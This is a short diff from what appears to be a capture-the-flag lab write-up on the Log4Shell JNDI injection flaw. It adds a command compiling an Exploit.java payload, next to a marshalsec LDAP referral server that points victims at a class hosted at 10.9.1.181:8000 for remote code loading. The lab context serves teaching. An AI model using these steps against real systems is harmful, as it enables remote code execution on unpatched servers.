@@ -5,6 +5,9 @@ the exploitation vectors and affected Java runtime versions:
 <https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/>
 
 (kali㉿kali)-[~/thm/solar/marshalsec]
+$ javac Exploit.java -source 8 -target 8
+
+(kali㉿kali)-[~/thm/solar/marshalsec]
 $ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.1.181:8000/#Exploit"
 
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
